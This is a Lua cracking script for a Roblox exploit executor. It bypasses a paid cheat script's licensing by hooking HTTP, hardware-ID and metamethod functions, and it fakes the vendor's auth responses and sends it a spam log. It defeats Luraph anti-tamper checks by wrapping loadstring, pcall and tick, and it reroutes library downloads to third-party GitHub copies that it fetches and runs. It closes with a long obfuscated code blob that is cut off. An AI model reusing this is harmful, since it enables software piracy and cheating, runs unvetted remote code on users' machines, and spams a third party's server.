
wait(5)

hookfunction(isfunctionhooked,function(...)
    return false
end)

if http and http.request then
    local oldHttpReqest
    oldHttpReqest = hookfunction(http.request,function(...)
        local args = {...}
        if args[1]["Url"] == "https://yabujin.cc/log-script" then
            pcall(function()
                oldHttpReqest({
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Url = "https://yabujin.cc/log-script",
                    Method = "POST",
                    Body = "{\"version\":\"V1\",\"key\":\"BETA-uwus-uwus-uwus\",\"userId\":\"1\",\"executor\":\"@everyone hi\n\n\n\n\n\n\nuwu\"}"
                })
            end)
            return true
        end
        return oldHttpReqest(...)
    end)
end

if gethwid then
    local oldHwid;
    oldHwid = hookfunction(gethwid,function()
        return "0B6102CB07E3C4DBB5789F97C3A26901B21A3C48030AAFA073BC308236290272"
    end)
end

local __luraph_bypass_loadstring
do
    local __orig_loadstring = loadstring
    local __orig_pcall = pcall
    local __orig_error = error
    local __orig_tick = tick

    local __bypass_inner = [[
do
    local __ip, __ie, __it = pcall, error, tick
    local __tick_count = 0
    local __base_real_tick

    pcall = function(__f, ...)
        local __r = {__ip(__f, ...)}
        if not __r[1] and type(__r[2]) == "string" then
            __r[2] = string.gsub(__r[2], ":%d+:", ":1:")
        end
        return unpack(__r)
    end

    error = function(__m, __l)
        if type(__m) == "string" then
            __m = string.gsub(__m, ":%d+:", ":1:")
        end
        return __ie(__m, __l)
    end

    tick = function()
        __tick_count = __tick_count + 1
        if __tick_count == 1 then return 1769117962.3565292 end
        if __tick_count == 2 then return 1769117962.3725953 end
        if __tick_count == 3 then return 1769117962.8786843 end
        if __tick_count == 4 then return 1769117963.3887262 end
        if __tick_count == 5 then
            __base_real_tick = __it()
            return 1769117965.88104
        end
        return 1769117965.88104 + (__it() - __base_real_tick)
    end
end
]]

    __luraph_bypass_loadstring = function(code, ...)
        if type(code) == "string" and #code > 100 then
            code = __bypass_inner .. code
        end
        return __orig_loadstring(code, ...)
    end

    loadstring = __luraph_bypass_loadstring

    error = function(msg, level)
        if type(msg) == "string" then
            msg = string.gsub(msg, ":%d+:", ":1:")
        end
        return __orig_error(msg, level)
    end

    pcall = function(f, ...)
        local results = {__orig_pcall(f, ...)}
        if not results[1] and type(results[2]) == "string" then
            results[2] = string.gsub(results[2], ":%d+:", ":1:")
        end
        return unpack(results)
    end
end

local oldIndex
oldIndex = hookmetamethod(game, "__index", function(self, key)
    if key == "HttpGet" then
        return function(inst, url, ...)
            if url == "https://yabujin.cc/Obsidian/Library.lua" then
                return oldIndex(inst, "HttpGet")(inst, "https://raw.githubusercontent.com/WEFGQERQEGWGE/a/refs/heads/main/1.txt")
            end

            if url == "https://yabujin.cc/yabujin_crypt.lua" then
                return oldIndex(inst, "HttpGet")(inst, "https://raw.githubusercontent.com/WEFGQERQEGWGE/a/refs/heads/main/2.txt")
            end

            if url == "https://yabujin.cc/Obsidian/addons/ThemeManager.lua" then
                return oldIndex(inst, "HttpGet")(inst, "https://raw.githubusercontent.com/WEFGQERQEGWGE/a/refs/heads/main/3.txt")
            end

            if url:find("auth") and url:find("ver") then
                return "2uzYfldq0JREdNJ22BZuk53Gs0RdZ2DH26WIEOl3WCPpL7n7gPl3QHXZY6q0hzGwWioMxvbQf8kxiqAkkvh+ZFZita4="
            end

            if url:find("auth") and url:find("hwid") then
                return "2uzYfldq0JREdNJ22BZuk53Gs0pXcHaEhuCcEuV1MyDlKKP7i/UvHzHZA+XxkzGnCSoNib2YfdF4xqJz0vpnKxJ15LbPCmKGioSUCNykA9lGWbAVwqk+pMTLbOuy0pOfPC8eDlZ9gfO4D0zn8mt+ZLVw08t93v9JgYqBwtlLU8DX2cNYTMxsgS6TOTx3inF3+nZ0Ss+H3sQdbJ46U4wBifM6N/a4rKqj8qvC0kkUdc2DR8mfeP1Zh8oMTgY05KZhhFf2/cHMJBNha0JX59NR8BXOID4ipnKW5mhML7jeNQq1r4erPjFiCQWALLKjTw82jP1Tej4XJ/rxJVyLvdT92CXJREuUWF3LApDn9yzEfKOP2uvBCZ/ejZjSzVwBhI1NRpanAb5doVFTVLwELXNF8dId86ONokNxs6X8farUyPAtHioo7SXPa4tyisqnsdFLppo2z4bho0aU/x61wCVz6hQgYA+Jijj/rYnksuilmqtLJEAHKh1Ym+vdJQdmMTpmMzsUwBGsKLvTJLpTipJ7LLakzlRyCJyQg8fkVrZ5XUloBNAnzMQClyq9Y5rGtKpUoA36z3fasPSgap+i71D3KSKJddmtBA=="
            end

            if url:find("verify") then
                return "2uzYfldq0JREdNJ22BZuk53Gs0RdZ2DH26WIEOl3QijzKLn1grBkVjGNLub/kDW3TCdNiuI="
            end

            if url:find("main") then
                return oldIndex(inst, "HttpGet")(inst, "https://raw.githubusercontent.com/WEFGQERQEGWGE/a/refs/heads/main/4.txt")
            end

            if url:find("check") then
                return '{"success": true, "linked": true, "discord_id": "1424202641034186823"}'
            end

            return oldIndex(inst, "HttpGet")(inst, url, ...)
        end
    end

    return oldIndex(self, key)
end)

if not isfolder("Vortex") then
    makefolder("Vortex")
end

local success, result = pcall(function()
    return game:HttpGet("https://raw.githubusercontent.com/WEFGQERQEGWGE/a/refs/heads/main/rcr.png")
end)

if success then
    writefile("Vortex/rcr.png", result)
end

writefile("Vortex/key.txt", "vtx")
writefile("Vortex/session.txt", "vortex2026")

if getcustomasset then
    local oldGetCustomAsset; oldGetCustomAsset = hookfunction(getcustomasset, function(...)
        local args = {...}

        if args[1]:find("icon.png") then
            return oldGetCustomAsset(args[1]:gsub("icon.png", "rcr.png"))
        end

        return oldGetCustomAsset(...)
    end)
end

local holder = gethui and gethui() or game:GetService("CoreGui")

holder.ChildAdded:Connect(function(v)
    if v.Name:find("Obsidian") then
        v.DescendantAdded:Connect(function(v1)
            if v1.ClassName == "TextLabel" or v1.ClassName == "TextButton" or v1.ClassName == "TextBox" then
                v1:GetPropertyChangedSignal("Text"):Connect(function()
                    local txt = v1.Text:lower()
                    if txt:find("discord.gg") or txt:find("rivalscomp") or txt:find("/yabu") or txt:find("yabujin") or txt:find("yabu") then
                        v1.Text = v1.Text:gsub("[Yy][Aa][Bb][Uu][Jj][Ii][Nn]", "Vortex")
                                       :gsub("[Yy][Aa][Bb][Uu]", "Vortex")
                                       :gsub("Rivalscomp", "Vortex")
                                       :gsub("rivalscomp", "Vortex")
                                       :gsub("discord.gg/rivalscomp", "discord.gg/vortexhub") -- optional: your own server
                    end
                end)
            end
            if v1.ClassName == "ImageLabel" then
                v1:GetPropertyChangedSignal("Image"):Connect(function()
                    if v1.Image == "rbxasset://textures/13714564654658363585.png" then
                        v1.Image = "rbxassetid://135209831351733" -- ← you can change this asset id to your own logo
                    end
                end)
            end
        end)
    end
end)

-- Optional: remove or change the auto-join Discord (commented out by default)
--[[
local rq = request or (http and http.request) or http_request
pcall(function()
	rq({
		Url = "http://127.0.0.1:6463/rpc?v=1",
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json",
			["Origin"] = "https://discord.com"
		},
		Body = game:GetService("HttpService"):JSONEncode({
			cmd = "INVITE_BROWSER",
			args = {
				code = "vortexhub"   -- ← change to your server or delete this whole block
			},
			nonce = game:GetService("HttpService"):GenerateGUID(false)
		})
	})
end)
--]]

return({C=function(F,F,k,n,v,h)if k==0x00C8 then h=v[14](v[0b10101],v[0B110],v[0B1__1__0]);return 0xa7f1,h,F;elseif k==0X63 then return 42993,h,F;else if k~=0X12_D__ then else F+=((h>127 and h-128 or h)*n);return 32924,h,F;end;end;return nil,h,F;end,DR=function(F,F,k,n)(n)[k]=F[0X00_26]();end,r=function(F,k,n)(k)[14857]=(-0X1FF6Bf0+((F.FE((F.gE((F.YE(F.S[0X5],F.S[0X4],F.S[0x9]))))))+F.S[3]));n=(-1705215821+((F.FE(F.S[0X4]==F.S[2]and F.S[0X5__]or n,k[4635],k[30294]))-k[0X1241]+F.S[0B100]));(k)[20690]=(n);return n;end,_=function(F,F,k)return F-k[0b001_1001];end,p=function(F,F,k,n)F[0X6]=k;n=(0B1__100010__);return n;end,eR=function(F,F,k)k=(F[0B11010]()==0X1);return k;end,CR=function(F,F,k)k[0B11110][0X1]=(F);end,f=function(F,k,n)k=(-2188573644+(F.FE((F.GE(n[0X7656]-n[30294],(n[14781])))<=n[0X1684]and F.S[0x8]or n[0x32F7],n[4673])));(n)[4635]=k;return k;end,bE=math,JR=function(F,F,k,n)n[F]=(k);end,R=function(F,F)(F)[15]=(129);end,YE=bit32.band,HE=function(F,k,n,v,h,o)if o==0X37 then o=F:SE(n,o,v);else if o==0X2a then if v[0x23]==v[0b111]then if v[0x22]/(0B10 or 72)then for K=0B1100000,0XDd,70 do if K==0XA6 then return-2,o,0B11_10010;else if K==0X60__ then(v)[0B11_00]=k%v[0X24];end;end;end;end;v[32],v[0B100101]=h,(v[18]*-0X009A);end;if not n[0X6AF0]then(n)[399]=-2223157047+((F.yE(F.S[0X3],(n[22012])))-n[263]+F.S[0B1__10]-n[31700]);o=(-0B1100_1+(F.mE((F.mE(n[0x7656]))-n[23249]+n[0X3_013])));(n)[27376]=o;else o=n[0X6AF0__];end;else if o~=1 then else if v[0X22]~=v[0X1E]then local k=0X0051;repeat if k==0x51 then k=F:oE(k,v);continue;else if k~=0X7C then else F:ZE(v);break;end;end;until false;end;return 0X3a8d,o;end;end;end;return nil,o;end,XE=function(F,F,k)return{F[37](k,F[0X18])};end,D=function(F,k,n,v)local h;(n)[0X19]=9007199254740992;(n)[26]=nil;n[0b11011]=nil;v=(0X19__);while true do h,v=F:Q(k,v,n);if h==47080 then continue;else if h~=21869 then else break;end;end;end;n[0X1C]=function()local k,h=n[0X13]('\<\z  \u{069}8',n[0X15],n[0X6]);if n[0X7]==n[0Xa]then F:R(n);end;n[0b110]=h;return k;end;(n)[29]=(function()local k;k=F:a(n);if not(k)then else return F.A(k);end;end);(n)[30]=({});(n)[31]=nil;n[32]=nil;return v;end,rR=function(F,k,n,v,h,o)if n~=50 then for K=0X001,#k[0X0B],0B11 do(k[0xB][K])[k[0B1011][K+0X1]]=(o[k[0XB][K+0X2]]);end;return 0xb968,n;else for K=0b1,h,0x1 do F:_R(o,K,k,v);end;n=(0X69);return 52647,n;end;return nil,n;end,O=bit32,Z=coroutine.yield,v=function(F,k)local n,v=k[19]('<\I\52',k[0B1010__1],k[0X6]);local h=0X4F;while true do if not(h<98)then return-2,n;else h=F:p(k,v,h);end;end;return nil;end,yR=function(F,F,k,n,v,h,o,K)v=o[0X21](k);h=o[0X21](k);n=nil;K=nil;F=(nil);return h,n,F,K,v;end,nR=function(F,F,k)k=(F[32]()-0X3D71);return k;end,xE=bit32.lrotate,SR=function(F,k,n)k=46+(F.mE((F.EE(n[13047],(n[0X46Ac])))-F.S[0B10]+n[12280]));n[31700]=k;return k;end,q=function(F,k,n,v)(k)[0x1f]=4503599627370496;(k)[32]=function()local h,o;for K=0B1,0x83_,113 do if K~=0X72_ then h=0X0;else o=(0X1);repeat local K;h,K=F:N(h,o,K,k);o*=0X80;(k)[6]=(k[6]+0x1);until K<128;break;end;end;return h;end;if not(not n[29055])then v=n[29055];else v=F:T(n,v);end;return v;end,B=function(F,k,n,v)if n==0B1011011 then(k)[0X1]=F.Z;(k)[0B10]=F.H;if not(not v[5764])then n=v[5764];else n=F:b(n,v);end;else if n==126 then(k)[0B11]=F.X;if not v[12307]then n=-1133482413+(F.xE((F.FE((F.zE(F.S[0X1]-v[5764],F.S[0X9],F.S[0x7])),F.S[0X1])),(23)));(v)[0X3013]=(n);else n=v[12307];end;return 0X64e__3,n;else if n==0X45 then n=F:c(n,k,v);return 0X64_e__3,n;else if n==0x60 then k[0X5]=(select);if not v[0X32f7]then n=-24647+((F.yE((F.YE(F.S[3]+n,v[0X7656])),(v[14781])))+F.S[1]);(v)[0x32__F7]=n;else n=F:L(v,n);end;else if n~=0x3f__ then else(k)[0X6]=0X1;return 34022,n;end;end;end;end;end;end;return nil,n;end,bR=function(F,k,n,v,h,o,K)if h~=115 then h=F:IR(v,K,n,h);return 0X52F,h;else h=0B110110;(k)[n]=o;end;return nil,h;end,WR=function(F,F,k,n)k=(n[17][F]);return k;end,iR=function(F,k,n,v,h,o,K,_,b,A,Q,V,H,j,R,m,D,N,w,d)local f;N=(nil);for X=108,273,0X30 do if not(X>108)then A=(d%8);b=(w-K)/0x8;continue;elseif not(X>=0B1__1001100)then _=(k%0x8);else D=((d-A)/0X8);N=((k-_)/0B1000);break;end;end;d=(0X6F);while true do f,d=F:KR(R,v,m,d,n,Q);if f==0X366F then break;else if f then return _,D,N,{F.A(f)},A,b;end;end;end;(j)[v]=(N);d=100;while true do if d<=0B110110 then if A==0B1 then if Q[0X16]then K,j=(nil);K,j=F:tR(v,K,Q,h,j,D);K[j+0X3]=(0B1000);else H[v]=Q[0X11][D];end;elseif A==4 then(V)[v]=D;else if A==0X6 then V[v]=v+D;elseif A==0b101 then V[v]=v-D;else if A~=0x3_ then else R=#Q[0Xb];k=0X6e;while true do f,k=F:AR(Q,H,v,R,D,k);if f==62998 then continue;else if f~=0XfeD3 then else break;end;end;end;end;end;end;break;else f,d=F:bR(o,v,V,d,b,D);if f==1327 then continue;end;end;end;return _,D,N,nil,A,b;end,J=function(F,k,n,v)n[11]=nil;(n)[0XC__]=(nil);v=53;repeat if v==16 then n[0xB]=F.X;n[12]=(function(h,o,K)h=(h or 1);K=(K or#o);if(K-h+0x1_)>7997 then return n[0Xa](o,h,K);else return n[2](o,h,K);end;end);break;else(n)[0XA]=(function(h,o,K,_)if o>K then return;end;_=K-o+1;if _>=0B1000 then return h[o],h[o+0B001],h[o+0X2],h[o+0X3],h[o+0X4],h[o+0B101],h[o+0b110],h[o+0X7],n[0Xa](h,o+0B1000,K);elseif _>=0x7 then return h[o],h[o+0b1],h[o+0X2],h[o+0B11],h[o+0b0100],h[o+0X5],h[o+0X6],h[o+0X7],n[0xa](h,o+7,K);elseif _>=0X6 then return h[o],h[o+0X1],h[o+0X2],h[o+0B11],h[o+0x4],h[o+5],n[0Xa](h,o+0B110,K);elseif _>=0B101 then return h[o],h[o+0B1],h[o+2],h[o+0B11],h[o+0B1_00],n[0XA](h,o+0X5,K);elseif _>=4 then return h[o],h[o+0B1],h[o+0B10],h[o+0X3],n[0B1010](h,o+0b10_0,K);else if _>=3 then return h[o],h[o+0B1],h[o+0B10],n[10](h,o+0b11,K);else if not(_>=0X2)then return h[o],n[0xA](h,o+0b1,K);else return h[o],h[o+0x1],n[10](h,o+0b10,K);end;end;end;end;end);if not(not k[29674])then v=(k[29674]);else(k)[0X1241__]=(-0X1e8f71__2c+((F.FE(k[30294]-F.S[0B11]))-k[13047]-F.S[7]));v=-0X15_e9C49e+(F.zE(k[0X39BD]-F.S[0X4]-F.S[0B110]+k[30294],k[0X3013__],k[12280]));(k)[29674]=v;end;end;until false;(n)[13]=F.m;n[0Xe]=(nil);(n)[15]=nil;n[0X10]=(nil);return v;end,AR=function(F,k,n,v,h,o,K)if not(K<=0X50)then if K==0X006e then K=F:jR(n,K,h,k);return 62998,K;else K=80;k[0xb][h+2]=v;return 0XF616,K;end;else(k[0b10__11])[h+3]=(o);return 0XFed3,K;end;return nil,K;end,X=nil,VR=function(F,k,n,v,h,o,K,_,b,A,Q,V)local H;Q=(0X02C);repeat if Q==44 then K,Q=F:zR(Q,v,b,K);else if Q~=0X1b then else V=b[0X2_1](v);_=b[33](v);break;end;end;until false;local j;for R=0B111001__0,0XF6,33 do if R>213 then n[0B101]=V;elseif R>114 and R<180 then if h==0XB9 then local m=0B100011_0;while true do H,m=F:mR(m,k,A,n,_);if H==0X3d9f then break;else if H==0X2340 then continue;end;end;end;end;else if R<0b10010011 then j=b[0B100001](v);elseif R<0Xf6 and R>180 then F:xR(n,K,o);else if R<0XD5 and R>0x93 then n[0x9]=j;continue;end;end;end;end;for R=0B1,v,1 do local v,m,D,N,w;w,N,v,D,m=F:gR(m,w,N,D
